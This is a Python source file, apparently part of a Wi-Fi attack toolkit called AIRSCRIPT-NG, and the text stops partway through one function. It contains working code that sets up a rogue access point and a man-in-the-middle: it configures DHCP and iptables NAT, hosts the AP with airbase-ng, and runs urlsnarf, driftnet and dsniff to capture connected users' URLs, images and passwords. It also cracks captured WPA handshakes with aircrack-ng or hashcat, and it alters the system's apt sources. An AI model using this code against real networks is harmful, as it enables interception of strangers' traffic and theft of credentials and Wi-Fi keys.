#!/usr/bin/python3
def reaverspecialdeps():
    import os
    if os.system("ls ~/.airscriptNG/options.txt 2>/dev/null >/dev/null") != 0 or os.system("ls ~/.airscriptNG/ >/dev/null") != 0:
        os.system("mkdir ~/.airscriptNG/ 2>/dev/null;touch ~/.airscriptNG/options.txt;echo '1' > ~/.airscriptNG/options.txt;apt purge reaver -y 2>/dev/null >/dev/null")
        if os.system("ls backup-repos >/dev/null 2>/dev/null") != 0: 
            os.system("sudo mkdir backup-repos;cd backup-repos;cp /etc/apt/sources.list ./")
        xvar = os.system("sudo cat /etc/apt/sources.list | grep 'deb http://http.kali.org/kali kali-rolling main non-free contrib' >/dev/null 2>/dev/null")
        if xvar != 0:
            os.system("lolxvarchartmp=$(mktemp -d) && cd $lolxvarchartmp && sudo cp /etc/apt/sources.list . && sudo echo 'deb http://http.kali.org/kali kali-rolling main non-free contrib #BY AIRSCRIPT-NG' >> sources.list && mv sources.list /etc/apt/sources.list && cd .. && rmdir $lolxvarchartmp && cd ~/ && apt-key adv --keyserver pgp.mit.edu --recv-keys ED444FF07D8D0BF6 2>/dev/null")
        depandancies()
        os.system("echo \"$(cat /etc/apt/sources.list | grep -v 'deb http://http.kali.org/kali kali-rolling main non-free contrib #BY AIRSCRIPT-NG')\" > /etc/apt/sources.list")
    else:
        check_depends()
def mitm_fakeap_func():#FIX THIS
    try:
        import os, time
        if os.system("ls -l /var/lib/dhcp/dhcpd.leases 2>/dev/null >/dev/null") != 0:
            os.system("touch /var/lib/dhcp/dhcpd.leases")
        global ch2
        global ch3
        global ch4
        global counter
        count = 0
        ch2 = ""
        ch3 = ""
        ch4 = ""
        os.system("clear")
        print("""\033[0;33;48m

    ███████╗ █████╗ ██╗  ██╗███████╗     █████╗ ██████╗ 
    ██╔════╝██╔══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔══██╗
    █████╗  ███████║█████╔╝ █████╗█████╗███████║██████╔╝
    ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝╚════╝██╔══██║██╔═══╝ 
    ██║     ██║  ██║██║  ██╗███████╗    ██║  ██║██║     
    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝     
    \033[0;39;48m
    """)
        print("Welcome to the MITM/FAKE-AP screen")
        print("Please note that to host a fake AP and MITM internet traffic, you'll need \033[0;31;48mtwo network interfaces\033[0;39;48m")
        print("You are not limited to the options here, feel free to fire up any tool like wireshark.")
        print("\n\033[1;34;48m-----------------------------------------OPTIONS-----------------------------------------\033[0;39;48m")
        print("\n[\033[1;32;48mREQUIRED\033[1;39;48m]- Host-ap with airbase-ng (hostapd support comming soon!)")
        print("[\033[0;33;48mUNSELECTED\033[1;39;48m]- Intercept HTTP links and URLs - Type [\033[1;34;48m2\033[1;39;48m]")
        print("[\033[0;33;48mUNSELECTED\033[1;39;48m]- Intercept any images - Type [\033[1;34;48m3\033[1;39;48m]")
        print("[\033[0;33;48mUNSELECTED\033[1;39;48m]- Intercept any unencrypted passwords (not currently working) - Type [\033[1;34;48m4\033[1;39;48m]")
        print("\n\033[1;34;48m-----------------------------------------OPTIONS-----------------------------------------\033[0;39;48m")
        def help1():
            print("[\033[1;32;48mSELECTED\033[1;39;48m]- Intercept HTTP links and URLs")
        def help2():
            print("[\033[1;32;48mSELECTED\033[1;39;48m]- Intercept any images")
        def help3():
            print("[\033[1;32;48mSELECTED\033[1;39;48m]- Intercept any unencrypted passwords (not currently working) ")
            print("\n\033[1;34;48m-----------------------------------------OPTIONS-----------------------------------------\033[0;39;48m")
        def helpe1():
            print("[\033[0;33;48mUNSELECTED\033[1;39;48m]- Intercept HTTP links and URLs - Type [\033[1;34;48m2\033[1;39;48m]")
        def helpe2():
            print("[\033[0;33;48mUNSELECTED\033[1;39;48m]- Intercept any images - Type [\033[1;34;48m3\033[1;39;48m]")
        def helpe3():
            print("[\033[0;33;48mUNSELECTED\033[1;39;48m]- Intercept any unencrypted passwords (not currently working) - Type [\033[1;34;48m4\033[1;39;48m]")
            print("\n\033[1;34;48m-----------------------------------------OPTIONS-----------------------------------------\033[0;39;48m")
        #help1()
        #help2()
        #help3()
        def idkwhat():
            os.system("clear")
            print("""\033[0;33;48m

    ███████╗ █████╗ ██╗  ██╗███████╗     █████╗ ██████╗ 
    ██╔════╝██╔══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔══██╗
    █████╗  ███████║█████╔╝ █████╗█████╗███████║██████╔╝
    ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝╚════╝██╔══██║██╔═══╝ 
    ██║     ██║  ██║██║  ██╗███████╗    ██║  ██║██║     
    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝     
    \033[0;39;48m
            """)
            print("Welcome to the MITM/FAKE-AP screen")
            print("Please note that to host a fake AP and MITM internet traffic, you'll need \033[0;31;48mtwo network interfaces\033[0;39;48m")
            print("You are not limited to the options here, feel free to fire up any tool like wireshark.")
            print("\n\033[1;34;48m-----------------------------------------OPTIONS-----------------------------------------\033[0;39;48m")
            print("\n[\033[1;32;48mREQUIRED\033[1;39;48m]- Host-ap with airbase-ng (hostapd support comming soon!)")
        while True:
            if count < 2:
                choc = input("\n\033[0;39;48mPlease choose two options, by entering the number.\033[1;31;48m ~# \033[0;39;48m")
                if choc != "" and choc.isnumeric() == True and choc in ["2","3","4"]:
                    if choc == "2":
                        ch2 = "X"
                        count += 1
                    if choc == "3":
                        ch3 = "X"
                        count += 1
                    if choc == "4":
                        ch4 = "X"
                        count += 1
                    idkwhat()
                    if ch2 != "":
                        help1()
                    if ch2 == "":
                        helpe1()
                    if ch3 != "":
                        help2()
                    if ch3 == "":
                        helpe2()    
                    if ch4 != "":
                        help3()
                    if ch4 == "":
                        helpe3()
                    continue
                else:
                    os.system("clear")
                    idkwhat()
                    if ch2 != "":
                        help1()
                    if ch2 == "":
                        helpe1()
                    if ch3 != "":
                        help2()
                    if ch3 == "":
                        helpe2()    
                    if ch4 != "":
                        help3()
                    if ch4 == "":
                        helpe3()
                    continue
            else:
                break
        crucial = input("\n\n\033[0;39;48mOptions correctly chosen [y/n]?\033[1;31;48m ~# \033[0;39;48m")
        if crucial.lower().startswith("y"):
            os.system("clear")
            print("\n")
            os.system("ls /sys/class/net | grep ^wl")
            print("\n")
            global airbase
            airbase = input("\033[1;32;48m[+]\033[1;39;48mOk, Now which interface shall I host the AP on? \033[1;31;48m ~# \033[0;39;48m ")
            airbase = str(airbase)
            os.system("clear")
            print("\n")
            os.system("ls /sys/class/net | grep -v lo | grep -v '%s' " %(airbase))
            print("\n")
            global inetface
            inetface = input("\033[1;32;48m[+]\033[1;39;48mWhich interface is connected to the internet? \033[1;31;48m ~# \033[0;39;48m ")
            inetface = str(inetface)
            global ssid
            ssid = input("\033[1;32;48m[?]\033[1;39;48mWhat shall I call the AP? (SSID) \033[1;31;48m ~# \033[0;39;48m ")
            ssid = str(ssid)
            global channelno
            channelno = input("\033[1;33;48m[?]\033[1;39;48mWhat channel shall I use? \033[1;31;48m ~# \033[0;39;48m ")
            channelno = str(channelno)
            global subnet
            subnet = input("\033[1;33;48m[?]\033[1;39;48mUse default subnet of \033[1;32;48m'192.168.1.x'\033[1;35;48m [y/n]? \033[1;31;48m ~# \033[0;39;48m ")
            subnet = str(subnet)
            global subnet2
            global subnet3
            subnet2 = "1"
            subnet3 = "0"
            if subnet.lower().startswith("n"):
                subnet2 = input("\033[1;33;48m[?]\033[1;35;48mPlease enter the third digit of the subnet \033[1;31;48m ~# \033[0;39;48m ")
                subnet3 = input("\033[1;33;48m[?]\033[1;35;48mPlease enter the fourth digit of the subnet \033[1;31;48m ~# \033[0;39;48m ")
                subnet2 = str(subnet2)
                subnet3 = str(subnet3)
            else:
                pass
            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep 'default-lease-time 600;' >/dev/null 2>/dev/null") != 0:
            #    os.system("echo 'default-lease-time 600;' >> /etc/dhcp/dhcpd.conf")
            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep 'max-lease-time 7200;' >/dev/null 2>/dev/null") != 0:
            #    os.system("echo 'max-lease-time 7200;' >> /etc/dhcp/dhcpd.conf")
            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep 'subnet 192.168.1.0 netmask 255.255.255.0{' >/dev/null 2>/dev/null") != 0:
            #    os.system("echo 'subnet 192.168.1.0 netmask 255.255.255.0{' >> /etc/dhcp/dhcpd.conf")
            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep '    option subnet-mask 255.255.255.0;' >/dev/null 2>/dev/null") != 0:
            #    os.system("echo '    option subnet-mask 255.255.255.0;' >> /etc/dhcp/dhcpd.conf")
            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep '    option broadcast-address 192.168.1.255;' >/dev/null 2>/dev/null") != 0:
            #    os.system("echo '    option broadcast-address 192.168.1.255;' >> /etc/dhcp/dhcpd.conf")
            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep '    option domain-name-servers 8.8.8.8;' >/dev/null 2>/dev/null") != 0:
            #    os.system("echo '    option domain-name-servers 8.8.8.8;' >> /etc/dhcp/dhcpd.conf")
            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep '    option routers 192.168.1.1;' >/dev/null 2>/dev/null") != 0:
            #    os.system("echo '    option routers 192.168.1.1;' >> /etc/dhcp/dhcpd.conf")
            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep '    range 192.168.1.2 192.168.1.100;' >/dev/null 2>/dev/null") != 0:
            #    os.system("echo '    range 192.168.1.2 192.168.1.100;' >> /etc/dhcp/dhcpd.conf")
            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep '}' >/dev/null 2>/dev/null") != 0:
            #    os.system("echo '}' >> /etc/dhcp/dhcpd.conf")
            if os.system("sudo cat /etc/dhcp/dhcpd.conf | grep '#BY AIRSCRIPT-NG' >/dev/null 2>/dev/null") != 0:
                os.system("echo '#BY AIRSCRIPT-NG' >> /etc/dhcp/dhcpd.conf")
                os.system("echo 'default-lease-time 600;' >> /etc/dhcp/dhcpd.conf")
                os.system("echo 'max-lease-time 7200;' >> /etc/dhcp/dhcpd.conf")
                os.system("echo 'subnet 192.168.%s.%s netmask 255.255.255.0{' >> /etc/dhcp/dhcpd.conf" %(subnet2,subnet3))
                os.system("echo '    option subnet-mask 255.255.255.0;' >> /etc/dhcp/dhcpd.conf")
                os.system("echo '    option broadcast-address 192.168.%s.255;' >> /etc/dhcp/dhcpd.conf" %(subnet2))
                os.system("echo '    option domain-name-servers 8.8.8.8;' >> /etc/dhcp/dhcpd.conf")
                global routeloop
                routeloop = int(subnet3)
                routeloop = routeloop + 1
                os.system("echo '    option routers 192.168.%s.%s;' >> /etc/dhcp/dhcpd.conf" %(subnet2,routeloop))
                global subnet4 
                global subnet5
                global subnet6
                subnet4 = int(subnet3)
                subnet5 = subnet4 + 2
                subnet6 = subnet4 + 100
                subnet5 = str(subnet5)
                subnet6 = str(subnet6)
                os.system("echo '    range 192.168.%s.%s 192.168.%s.%s;' >> /etc/dhcp/dhcpd.conf" %(subnet2,subnet5,subnet2,subnet6))
                os.system("echo '}' >> /etc/dhcp/dhcpd.conf")
            os.system("clear")
            print("""\033[0;33;48m

    ███████╗ █████╗ ██╗  ██╗███████╗     █████╗ ██████╗ 
    ██╔════╝██╔══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔══██╗
    █████╗  ███████║█████╔╝ █████╗█████╗███████║██████╔╝
    ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝╚════╝██╔══██║██╔═══╝ 
    ██║     ██║  ██║██║  ██╗███████╗    ██║  ██║██║     
    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝     
    \033[0;39;48m
            """)
            print("\n\033[1;34;48m-----------------------------------------OPTIONS-----------------------------------------\033[0;39;48m")
            print("\n[\033[1;32;48mREQUIRED\033[1;39;48m]- Host-ap with airbase-ng (hostapd support comming soon!)")
            if ch2 != "":
                help1()
            if ch3 != "":
                help2()    
            if ch4 != "":
                help3()
            print("\n[\033[1;32;48mINFO\033[1;39;48m]- SSID: %s" %(ssid))
            print("[\033[1;32;48mINFO\033[1;39;48m]- CHANNEL: %s" %(channelno))
            print("[\033[1;32;48mINFO\033[1;39;48m]- AP INTERFACE: %s" %(airbase))
            print("[\033[1;32;48mINFO\033[1;39;48m]- INTERNET INTERFACE: %s" %(inetface))
            print("[\033[1;32;48mINFO\033[1;39;48m]- SUBNET: 192.168.%s.x" %(subnet2))
            #Put details of AP, card, etc..
            print("\n\033[1;34;48m-----------------------------------------OPTIONS-----------------------------------------\033[0;39;48m")
            randchoice = input("\n\n\033[0;39;48mStart AP [y/n]?\033[1;31;48m ~# \033[0;39;48m")
            #Finish this
            if randchoice.lower().startswith("y"):
                #START HERE
                #c2 = urlsnarf 
                #c3 = driftnet
                #c4 = dsniff
                #Common os.system stuff here
                def c2c3():
                    if os.system("ls ~/.airscriptNG/traffic-sniff.sh >/dev/null 2>/dev/null") != 0:
                        os.system("mkdir ~/.airscriptNG/ >/dev/null 2>/dev/null; touch ~/.airscriptNG/traffic-sniff.sh ; cd ~/.airscriptNG/;chmod +x traffic-sniff.sh")
                        os.system("echo 'ip link set %s down ; iw dev %s set type monitor ; ip link set %s up'  >> ~/.airscriptNG/traffic-sniff.sh " %(airbase,airbase,airbase))
                        os.system("echo 'sleep 3' >> ~/.airscriptNG/traffic-sniff.sh")
                        os.system("echo 'ifconfig at0 192.168.%s.%s netmask 255.255.255.0' >> ~/.airscriptNG/traffic-sniff.sh" %(subnet2,routeloop))
                        os.system("echo 'dhcpd at0' >> ~/.airscriptNG/traffic-sniff.sh")
                        os.system("echo 'iptables --flush' >> ~/.airscriptNG/traffic-sniff.sh")
                        os.system("echo 'iptables --table nat --flush' >> ~/.airscriptNG/traffic-sniff.sh")
                        os.system("echo 'iptables --delete-chain' >> ~/.airscriptNG/traffic-sniff.sh")
                        os.system("echo 'iptables --table nat --delete-chain' >> ~/.airscriptNG/traffic-sniff.sh")
                        os.system("echo 'iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE' >> ~/.airscriptNG/traffic-sniff.sh" %(inetface))
                        os.system("echo 'iptables --append FORWARD -j ACCEPT --in-interface at0' >> ~/.airscriptNG/traffic-sniff.sh")
                        os.system("echo 'echo 1 > /proc/sys/net/ipv4/ip_forward' >> ~/.airscriptNG/traffic-sniff.sh")
                c2c3()
                if ch2 != "" and ch3 != "":
                    os.system("sh ~/.airscriptNG/traffic-sniff.sh & xterm -geometry -7640 -title 'Hosting AP, CTRL+C to exit' -bg '#FFFFFF' -fg '#000000' -e 'airbase-ng -e %s -c %s %s' & xterm -geometry -4320+7640 -title 'Sniffing URLS and Links' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;urlsnarf -i at0 | cut -d \" \" -f 6,7,8' & xterm -geometry +4320 -title 'Sniffing Images' -bg '#FFFFFF' -fg '#000000' -e 'echo Starting in 5;sleep 1;echo 4;sleep 1;echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;clear;echo \"\nResize the Black window to your liking!\";driftnet -i at0' " %(ssid,channelno,airbase))
                if ch2 != "" and ch4 != "":
                    os.system("sh ~/.airscriptNG/traffic-sniff.sh & xterm -geometry -7640 -title 'Hosting AP, CTRL+C to exit' -bg '#FFFFFF' -fg '#000000' -e 'airbase-ng -e %s -c %s %s' & xterm -geometry -4320+7640 -hold -title 'Sniffing URLS and Links' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;urlsnarf -i at0 | cut -d \" \" -f 6,7,8' & xterm -geometry +4320 -title 'Sniffing Passwords' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;dsniff -i at0' " %(ssid,channelno,airbase))
                if ch3 != "" and ch4 != "":
                    os.system("sh ~/.airscriptNG/traffic-sniff.sh & xterm -geometry -7640 -title 'Hosting AP, CTRL+C to exit' -bg '#FFFFFF' -fg '#000000' -e 'airbase-ng -e %s -c %s %s' & xterm -geometry -4320+7640 -title 'Sniffing Images' -bg '#FFFFFF' -fg '#000000' -e 'echo Starting in 5;sleep 1;echo 4;sleep 1;echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;clear;echo \"\nResize the Black window to your liking!\";driftnet -i at0' & xterm -geometry +4320 -title 'Sniffing Passwords' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;dsniff -i at0' " %(ssid,channelno,airbase))
                #END HERE
                import atexit
                def exynos():
                    import os
                    if os.system("sudo cat /etc/dhcp/dhcpd.conf | grep '#BY AIRSCRIPT-NG' >/dev/null 2>/dev/null") == 0:
                        os.system("kill $(ps | grep xterm | awk -F ' ' {'print $1'}) 2>/dev/null ")
                        os.system("ip link set %s down; iw dev %s set type managed; ip link set %s up" %(airbase,airbase,airbase))
                        os.system("head -n -10 /etc/dhcp/dhcpd.conf > .dhconfhelp.txt; mv .dhconfhelp.txt /etc/dhcp/dhcpd.conf")
                        os.system("iptables --flush")
                        os.system("iptables --table nat --flush")
                        os.system("iptables --delete-chain")
                        os.system("iptables --table nat --delete-chain")
                        os.system("service isc-dhcp-server stop")
                        os.system("rm /var/run/dhcpd.pid 2>/dev/null")
                        os.system("clear")
                atexit.register(exynos)
            elif randchoice.lower().startswith("n"):
                title()
        elif crucial.lower().startswith("n"):
            title()
        elif crucial != "y" or crucial != "n":
            title()
        #print("You can select any 3 for now (No.1 is required). Selected options will appear in the box -> |-[%s]-[%s]-[%s]-|" %(ch1,ch2,ch3))
    #WILL HOST THE CODE TO CREATE FAKE AP, RETRACE STEPS AND CONDUCT TMUX IN XTERM WITH DIFFERENT POSITIONS.
    #xterm -geometry 125x35+4320 -bg '#FFFFFF' -fg '#000000' THIS MAKES IT APPEAR TOP RIGHT
    #xterm -geometry 125x35+4320+7640 -bg '#FFFFFF' -fg '#000000' BOTTOM RIGHT
    #xterm -geometry 125x35-4320+7640 -bg '#FFFFFF' -fg '#000000' BOTTOM LEFT
    #xterm -geometry 125x35-7640 -bg '#FFFFFF' -fg '#000000' TOP LEFT try 87x25
    #ENCLOSE THIS IN A TRY/EXCEPT LOOP
    #os.system("echo -n \"\033[0;39;48m // \033[1;33;48mChipset:\033[0;39;48m \"; echo $(airmon-ng | awk -F ' ' {'print $4,$5,$6,$7'} | grep -v Chipset) ")
    except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
        import os
        if os.system("sudo cat /etc/dhcp/dhcpd.conf | grep '#BY AIRSCRIPT-NG' >/dev/null 2>/dev/null") == 0:
            os.system("kill $(ps | grep xterm | awk -F ' ' {'print $1'}) 2>/dev/null")
            os.system("ip link set %s down; iw dev %s set type managed; ip link set %s up" %(airbase,airbase,airbase))
            os.system("head -n -10 /etc/dhcp/dhcpd.conf > .dhconfhelp.txt; mv .dhconfhelp.txt /etc/dhcp/dhcpd.conf")
            os.system("iptables --flush")
            os.system("iptables --table nat --flush")
            os.system("iptables --delete-chain")
            os.system("iptables --table nat --delete-chain")
            os.system("service isc-dhcp-server stop")
            os.system("rm /var/run/dhcpd.pid 2>/dev/null")
            os.system("clear")
            #os.system("tac /etc/dhcp/dhcpd.conf | sed '1,10 d' | tac >> /etc/dhcp/dhcpd.conf") REALLY REALLY BROKEN!
            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '#BY AIRSCRIPT-NG')\" > /etc/dhcp/dhcpd.conf")
            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v 'default-lease-time 600;')\" > /etc/dhcp/dhcpd.conf")
            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v 'max-lease-time 7200;')\" > /etc/dhcp/dhcpd.conf")
            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v 'subnet 192.168.%s.%s netmask 255.255.255.0{')\" > /etc/dhcp/dhcpd.conf" %(subnet2,subnet3))
            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '    option subnet-mask 255.255.255.0;')\" > /etc/dhcp/dhcpd.conf")
            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '    option broadcast-address 192.168.%s.255;')\" > /etc/dhcp/dhcpd.conf" %(subnet2))
            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '    option domain-name-servers 8.8.8.8;')\" > /etc/dhcp/dhcpd.conf")
            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '    option routers 192.168.%s.%s;')\" > /etc/dhcp/dhcpd.conf" %(subnet2,routeloop))
            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '    range 192.168.%s.%s 192.168.%s.%s;')\" > /etc/dhcp/dhcpd.conf" %(subnet2,subnet5,subnet2,subnet6))
            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '}')\" > /etc/dhcp/dhcpd.conf")
        else:
            os.system("clear")
        os._exit(1)
def handshake_func():
    #Start here
    try:
        import os
        print("\033[1;33;48m[-] \033[0;37;48mChecking for dependancies")
        check_depends()
        while True:
            os.system("clear")
            print("""\033[0;33;48m

         ██████╗██████╗  █████╗  ██████╗██╗  ██╗        ██████╗ █████╗ ██████╗ 
        ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝       ██╔════╝██╔══██╗██╔══██╗
        ██║     ██████╔╝███████║██║     █████╔╝        ██║     ███████║██████╔╝
        ██║     ██╔══██╗██╔══██║██║     ██╔═██╗        ██║     ██╔══██║██╔═══╝ 
        ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗    ██╗╚██████╗██║  ██║██║     
         ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     

        \033[0;39;48m
                    """)
            print("\n\033[1;34;48mType [1] - Crack the WPA-HANDSHAKE with CPU")
            print("\033[1;32;48mType [2] - Crack the WPA-HANDSHAKE with GPU (Much faster)")
            print("\n\n\033[1;37;40mType [99] - Return to menu")
            global cpugpu
            cpugpu = input("\033[0;39;48m\n|MENU|PRE-EXISTING_HANDSHAKE|\033[0;32;48m(ENTER CHOICE\033[0;39;48m) \033[1;31;48m~# \033[0;39;48m")
            if cpugpu != "":
                break
        cpugpu = str(cpugpu)
        if cpugpu == "1": #CPU CRACK SECTION
            from tkinter.filedialog import askopenfilename, Tk as capture
            capture().withdraw()
            global cpucrack
            somepath = input("\nPlease specify a .cap file. (press enter) \033[1;31;48m~# \033[0;39;48m")
            cpucrack = askopenfilename()
            cpucrack = str(cpucrack)
            print("\n[\033[1;32;48mCAP FILE\033[1;39;48m]: %s" %(cpucrack))
            input("\nPlease specify a Wordlist. (press enter) \033[1;31;48m~# \033[0;39;48m")
            wordcrack = askopenfilename()
            wordcrack = str(wordcrack)
            os.system("aircrack-ng %s -w %s" %(cpucrack,wordcrack))
            print("\n")
            os._exit(1)
        elif cpugpu == "2": #GPU CRACK SECTION
            from tkinter import filedialog
            from tkinter.filedialog import askopenfilename, Tk as captured
            captured().withdraw()
            global gpucrack
            somepath = input("\nPlease specify a .cap file. Must not be cleaned with \033[1;33;48mWPACLEAN\033[0;39;48m or such. (press enter) \033[1;31;48m~# \033[0;39;48m")
            gpucrack = askopenfilename()
            gpucrack = str(gpucrack)
            print("\n[\033[1;32;48mCAP FILE\033[1;39;48m]: %s" %(gpucrack))
            while True:
                hcatinstalled = input("\nHave you installed hashcat and the drivers using option [8] from the menu? [y/n] \033[1;31;48m~# \033[0;39;48m")
                if hcatinstalled.lower().startswith("n"):
                    hashcatdownloadfunc()
                    driverdownloadfunc()
                    os.system("clear")
                    drifunc()
                    break
                if hcatinstalled.lower().startswith("y"):
                    break
                else:
                    os.system("clear")
                    continue
            input("\n\033[1;39;48mWhere is the hashcat directory? Not hashcat-utils! EG: click inside the hashcat-3.x-x folder and press ok. (press enter) \033[1;31;48m~# \033[0;39;48m")
            global hcatpath
            captured().withdraw()
            hcatpath = filedialog.askdirectory()
            hcatpath = str(hcatpath)
            def hcatfunc():
                global mainwordlist
                mainwordlist = "N/A"
                os.system("clear")
                print("""\033[0;33;48m

     ██████╗██████╗  █████╗  ██████╗██╗  ██╗        ██████╗ █████╗ ██████╗ 
    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝       ██╔════╝██╔══██╗██╔══██╗
    ██║     ██████╔╝███████║██║     █████╔╝        ██║     ███████║██████╔╝
    ██║     ██╔══██╗██╔══██║██║     ██╔═██╗        ██║     ██╔══██║██╔═══╝ 
    ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗    ██╗╚██████╗██║  ██║██║     
     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     
        \033[0;39;48m
                    """)
                print("\n[\033[1;32;48mCAP FILE\033[1;39;48m]: %s" %(gpucrack))
                print("[\033[1;32;48mHASHCAT PATH\033[1;39;48m]: %s" %(hcatpath))
                print("[\033[1;32;48mWORDLIST\033[1;39;48m]: %s" %(mainwordlist))
                def hfinal():
                    os.system("clear")
                    print("""\033[0;33;48m

     ██████╗██████╗  █████╗  ██████╗██╗  ██╗        ██████╗ █████╗ ██████╗ 
    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝       ██╔════╝██╔══██╗██╔══██╗
    ██║     ██████╔╝███████║██║     █████╔╝        ██║     ███████║██████╔╝
    ██║     ██╔══██╗██╔══██║██║     ██╔═██╗        ██║     ██╔══██║██╔═══╝ 
    ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗    ██╗╚██████╗██║  ██║██║     
     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     
\033[0;39;48m
                        """)
                    print("\n[\033[1;32;48mCAP FILE\033[1;39;48m]: %s" %(gpucrack))
                    print("[\033[1;32;48mHASHCAT PATH\033[1;39;48m]: %s" %(hcatpath))
                    print("[\033[1;32;48mHASHCAT-UTILS PATH\033[1;39;48m]: %s" %(hcatutilspath))
                    print("[\033[1;32;48mWORDLIST\033[1;39;48m]: %s" %(mainwordlist))
                    print("[\033[1;32;48mATTACK MODE\033[1;39;48m]: %s" %(ackmode))
                    print("[\033[1;32;48mTEMPERATURE RETAIN\033[1;39;48m]: %s" %(retaingputemp))
                    print("[\033[1;32;48mTEMPERATURE ABORT\033[1;39;48m]: %s" %(maxgputemp))
                if mainwordlist == "N/A":
                    global ackmode
                    global hcatutilspath
                    global maxgputemp
                    global retaingputemp
                    print("\n\033[1;33;48mWordlist not chosen yet. Your options are:\033[1;39;48m")
                    print("\n\033[1;34;48mType [1] - Choose a wordlist/dictionary and start cracking.")
                    print("\033[1;35;48mType [2] - Use keyspace brute-force, no wordlist needed")
                    print("\033[1;37;48mType [3] - Use a built-in wordlists, from Skull-security")
                    print("\n\n\033[1;37;40mType [99] - Return to menu \033[0;39;48m")
                    global critchoice
                    critchoice = input("\n\033[0;39;48mEnter choice \033[1;31;48m~# \033[0;39;48m")
                    if critchoice == "1":
                        ackmode = "Standard user-chosen wordlist"
                        input("\nReady to choose a \033[1;33;48mWordlist?\033[0;39;48m. (press enter) \033[1;31;48m~# \033[0;39;48m")
                        mainwordlist = askopenfilename()
                        mainwordlist = str(mainwordlist)
                        input("Please locate and click inside the \033[1;33;48mHashcat-utils\033[0;39;48m directory. Remember to click inside and press ok! (press enter) \033[1;31;48m~# \033[0;39;48m")
                        hcatutilspath = filedialog.askdirectory()
                        hcatutilspath = str(hcatutilspath)
                        while True:
                            retaingputemp = input("What temperature do you want to retain? (degress celsius) \033[1;31;48m~# \033[0;39;48m")
                            maxgputemp = input("What should be the cutoff/maximum temperature limit? (degress celsius) \033[1;31;48m~# \033[0;39;48m")
                            retaingputemp = int(retaingputemp)
                            maxgputemp = int(maxgputemp)
                            if retaingputemp < 80 and maxgputemp < 85:
                                retaingputemp = str(retaingputemp)
                                maxgputemp = str(maxgputemp)
                                break
                            else:
                                retaingputemp = str(retaingputemp)
                                maxgputemp = str(maxgputemp)
                                print("\n\033[1;31;48mTemperature value inappropriate! Please input proper and safe values.\033[0;39;48m [\033[1;32;48m<85c for retain \033[0;39;48m and \033[1;32;48m<90c for max\033[0;39;48m]")
                                continue
                        hfinal()
                        if os.system("ls ~/.airscriptNG/ >/dev/null") != 0:
                            os.system("mkdir ~/.airscriptNG/ 2>/dev/null")
                        if input("\n\033[0;39;48mOptions correctly chosen? Start cracking? [y/n] \033[1;31;48m~# \033[0;39;48m").lower().startswith("y"):
                            if os.system("ls ~/.airscriptNG/HANDSHAKEFILE >/dev/null 2>/dev/null") != 0:
                                os.system("touch ~/.airscriptNG/HANDSHAKEFILE")
                            os.system("cd %s/src/ && ./cap2hccapx.bin %s ~/.airscriptNG/HANDSHAKEFILE && cd %s/ && ./hashcat64.bin -a 0 -m 2500 ~/.airscriptNG/HANDSHAKEFILE %s --gpu-temp-retain=%s --gpu-temp-abort=%s -D 2 && echo '\n\nHere is any cracked hashes:' && cat %s/hashcat.potfile && echo '\n'" %(hcatutilspath,gpucrack,hcatpath,mainwordlist,retaingputemp,maxgputemp,hcatpath))
                            os.system("rm ~/.airscriptNG/HANDSHAKEFILE 2>/dev/null")
                            os._exit(1)
                        else:
                            title()
                    elif critchoice == "2":
                        ackmode = "Keyspace bruteforce"
                        mainwordlist = str("Not applicable")
